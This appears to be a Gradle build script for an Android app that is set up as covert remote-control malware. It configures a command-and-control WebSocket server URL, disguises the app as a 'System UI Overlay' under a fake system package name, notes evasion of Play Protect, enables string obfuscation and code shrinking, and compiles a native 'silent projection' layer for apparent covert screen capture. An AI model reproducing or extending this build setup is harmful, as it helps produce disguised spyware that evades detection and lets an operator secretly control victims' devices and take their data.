plugins {
    id 'com.android.application'
}

def skipParanoid = true

if (!skipParanoid) {
    try {
        apply plugin: 'org.lsposed.lsparanoid'
        println '[OK] LSParanoid acoplado.'
    } catch (Exception e) {
        println '[WARN] LSParanoid nao disponivel: ' + e.message
    }
}

// ─── KEYSTORE — read from local.properties (NEVER commit passwords) ──────────
// Create android/local.properties with:
//   KEYSTORE_PATH=../your-keystore.jks
//   KEYSTORE_PASS=your_password
//   KEY_ALIAS=your_alias
//   KEY_PASS=your_key_password
def localProps = new Properties()
def localPropsFile = rootProject.file('local.properties')
if (localPropsFile.exists()) {
    localProps.load(new FileInputStream(localPropsFile))
}

// ─── C2 CONFIG — read from local.properties ──────────────────────────────────
// Add to local.properties:
//   C2_URL=wss://YOUR_SERVER:PORT/ws
//   APP_ID=com.your.unique.package
//   APP_VERSION_CODE=10205
//   APP_VERSION_NAME=1.2.5
def c2Url          = localProps.getProperty('C2_URL',          'wss://CONFIGURE_ME:7771/ws')
def appId          = localProps.getProperty('APP_ID',          'com.android.systemui.overlay')
def appVersionCode = localProps.getProperty('APP_VERSION_CODE','10205').toInteger()
def appVersionName = localProps.getProperty('APP_VERSION_NAME','1.2.5')
def appLabel       = localProps.getProperty('APP_LABEL',       'System UI Overlay')

android {
    namespace 'com.seguranca.protecao'
    compileSdk 34

    defaultConfig {
        // applicationId read from local.properties — unique per build, no Play Protect conflict
        applicationId appId
        minSdk 24
        targetSdk 34
        versionCode appVersionCode
        versionName appVersionName

        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"

        // ─── BuildConfig fields ────────────────────────────────────────────────
        buildConfigField "boolean", "IS_OBFUSCATED",    "true"
        buildConfigField "String",  "SERVER_URL",       "\"${c2Url}\""
        buildConfigField "String",  "APP_LABEL",        "\"${appLabel}\""

        // ─── NDK / Silent Projection native layer ─────────────────────────────
        // Enabled — requires CMake in SDK Manager.
        // If CMake missing, Gradle will print a clear error; install via SDK Manager then rebuild.
        externalNativeBuild {
            cmake {
                cppFlags "-std=c++17 -O2"
                arguments "-DANDROID_STL=c++_shared", "-DANDROID_PLATFORM=android-24"
            }
        }
        ndk {
            abiFilters 'armeabi-v7a', 'arm64-v8a'
        }
    }

    // ─── CMake for native silent projection ───────────────────────────────────
    externalNativeBuild {
        cmake {
            path "src/main/cpp/CMakeLists.txt"
            version "3.22.1"
        }
    }

    // ─── Signing — credentials sourced from local.properties only ─────────────
    signingConfigs {
        release {
            def ksPath = localProps.getProperty('KEYSTORE_PATH', '')
            storeFile     ksPath ? file(ksPath) : null
            storePassword localProps.getProperty('KEYSTORE_PASS', '')
            keyAlias      localProps.getProperty('KEY_ALIAS',     '')
            keyPassword   localProps.getProperty('KEY_PASS',      '')
            v1SigningEnabled  true
            v2SigningEnabled  true
            enableV3Signing   true
            enableV4Signing   true
        }
    }

    buildTypes {
        debug {
            minifyEnabled    false
            shrinkResources  false
            debuggable       false   // no debuggable even in debug builds
        }
        release {
            minifyEnabled    true
            shrinkResources  false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig    signingConfigs.release
            debuggable       false
        }
    }

    aaptOptions {
        cruncherEnabled = false
    }

    packagingOptions {
        jniLibs { useLegacyPackaging = true }
        resources {
            excludes += [
                'DebugProbesKt.bin', 'META-INF/*.version',
                'META-INF/NOTICE*',  'META-INF/LICENSE*',
                'META-INF/DEPENDENCIES', 'META-INF/services/*',
                'kotlin/**', 'okhttp3/**', 'assets/dexopt/*'
            ]
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_11
        targetCompatibility JavaVersion.VERSION_11
    }

    buildFeatures {
        viewBinding  true
        buildConfig  true
    }
}

dependencies {
    implementation('androidx.appcompat:appcompat:1.6.1')         { exclude group: 'androidx.profileinstaller' }
    implementation('com.google.android.material:material:1.11.0') { exclude group: 'androidx.profileinstaller' }
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation('androidx.lifecycle:lifecycle-runtime-ktx:2.7.0') { exclude group: 'androidx.profileinstaller' }
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
    implementation 'com.google.code.gson:gson:2.10.1'
    implementation('androidx.work:work-runtime:2.9.0')            { exclude group: 'androidx.profileinstaller' }
    implementation('androidx.room:room-runtime:2.6.1')            { exclude group: 'androidx.profileinstaller' }
    annotationProcessor 'androidx.room:room-compiler:2.6.1'

    if (skipParanoid) {
        compileOnly 'org.lsposed.lsparanoid:core:0.5.2'
    }

    testImplementation 'junit:junit:4.13.2'
    androidTestImplementation 'androidx.test.ext:junit:1.1.5'
    androidTestImplementation 'androidx.test.espresso:espresso-core:3.5.1'
}

configurations.all {
    exclude group: 'androidx.profileinstaller', module: 'profileinstaller'
}
